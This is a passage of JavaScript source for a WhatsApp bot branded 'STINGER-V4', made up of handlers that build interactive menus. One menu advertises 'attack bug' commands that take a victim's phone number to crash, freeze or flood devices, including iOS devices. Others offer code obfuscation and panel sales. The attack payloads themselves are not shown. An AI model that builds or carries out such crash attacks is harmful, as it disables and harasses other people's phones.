title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: panelmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'stinger-bug': {
await loading()
const version = require("baileys/package.json").version
const bugmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
╰⭑➤➤⭑➤➤⭑➤  ᴄᴏᴜʀꜱᴇ ʙᴜɢ
> 𝐬𝐭𝐢𝐧𝐠𝐞𝐫-𝐛𝐥𝐚𝐬𝐭 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ᴀᴛᴛᴀᴄᴋ ʙᴜɢ
> 𝐬𝐭𝐢𝐧𝐠𝐞𝐫-𝐯𝟐 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐬𝐥𝐢𝐝𝐞 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐟𝐫𝐞𝐞𝐳𝐞 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐦𝐞𝐝𝐢𝐮𝐦 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ᴀᴛᴛᴀᴄᴋ ᴏᴛʜᴇʀ
> 𝐬𝐭𝐢𝐧𝐠-𝐢𝐨𝐬 [ 𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐜𝐫𝐚𝐬𝐡 [𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐚𝐭𝐤 [𝐧𝐮𝐦𝐛𝐞𝐫] ◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'sting-antibug': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴀɴᴛɪʙᴜɢ 
> 𝐬𝐭𝐢𝐧𝐠-𝐨𝐧 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐨𝐟𝐟 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐩𝐚𝐲 ◁️❄️🕷️
> 𝐜𝐨𝐧𝐟𝐢𝐫𝐦-𝐩𝐚𝐲 ◁️❄️🕷

𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐄𝐒-𝐓𝐄𝐀𝐌𝐒 𝐀𝐍𝐓𝐈𝐁𝐔𝐆™`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'storemenu': {
await loading()
const version = require("baileys/package.json").version
const storemenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ: ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
╰⭑➤➤⭑➤➤⭑➤ ꜱᴛᴏʀᴇ ᴍᴇɴᴜ
> 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 ◁️❄️🕷️
> 𝐝𝐚𝐧𝐚𝐦𝐚𝐬𝐮𝐤 ◁️❄️🕷️
> 𝐩𝐫𝐨𝐬𝐞𝐬 ◁️❄️🕷️
> 𝐝𝐨𝐧𝐞 ◁️❄️🕷️
> 𝐣𝐩𝐦𝐩𝐫𝐨𝐦𝐨𝐬𝐢 ◁️❄️🕷️
> 𝐣𝐩𝐦𝟑 ◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: storemenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'stinger-v4': {
await loading()
const version = require("baileys/package.json").version
const allmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯
╰⭑➤➤⭑➤➤⭑➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
> 𝐚𝐝𝐝-𝐬𝐭𝐢𝐧𝐠 ◁️❄️🕷️
> 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 ◁️❄️🕷️
> 𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 ◁️❄️🕷️
> 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴛᴏᴏʟꜱ
> 𝐞𝐧𝐜 [ 𝐜𝐨𝐝𝐞 ]◁️❄️🕷️
> 𝐞𝐧𝐜𝐫𝐲𝐩𝐭 [ 𝐜𝐨𝐝𝐞 ]◁️❄️🕷️
> 𝐚𝐢 [ 𝐭𝐞𝐱𝐭 ]◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ
> 𝐡𝐢𝐝𝐞𝐭𝐚𝐠 ◁️❄️🕷️
> 𝐭𝐚𝐠𝐚𝐥𝐥 ◁️❄️🕷️
> 𝐬𝐭𝐢𝐧𝐠-𝐤𝐢𝐜𝐤 ◁️❄️🕷️
> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️
> 𝐝𝐞𝐦𝐨𝐭𝐞 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ꜱᴛᴏʀᴇ
> 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 ◁️❄️🕷️
> 𝐝𝐚𝐧𝐚𝐦𝐚𝐬𝐮𝐤 ◁️❄️🕷️
> 𝐩𝐫𝐨𝐬𝐞𝐬 ◁️❄️🕷️
> 𝐝𝐨𝐧𝐞 ◁️❄️🕷️
> 𝐣𝐩𝐦𝐩𝐫𝐨𝐦𝐨𝐬𝐢 ◁️❄️🕷️
> 𝐣𝐩𝐦𝟑 ◁️❄️🕷️

╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ᴘᴀɴᴇʟ
> 𝟏𝐆𝐁 ◁️❄️🕷️
> 𝟐𝐆𝐁 ◁️❄️🕷️
> 𝟑𝐆𝐁 ◁️❄️🕷️
> 𝟒𝐆𝐁 ◁️❄️🕷️
> 𝟓𝐆𝐁 ◁️❄️🕷️
> 𝟔𝐆𝐁 ◁️❄️🕷️
> 𝟕𝐆𝐁 ◁️❄️🕷️
> 𝟖𝐆𝐁 ◁️❄️🕷️
> 𝟗𝐆𝐁 ◁️❄️🕷️
> 𝐮𝐧𝐥𝐢 ◁️❄️🕷️
> 𝐥𝐢𝐬𝐭𝐬𝐫𝐯 ◁️❄️🕷️
> 𝐝𝐞𝐥𝐬𝐫𝐯 ◁️❄️🕷️`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'toolsmenu': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
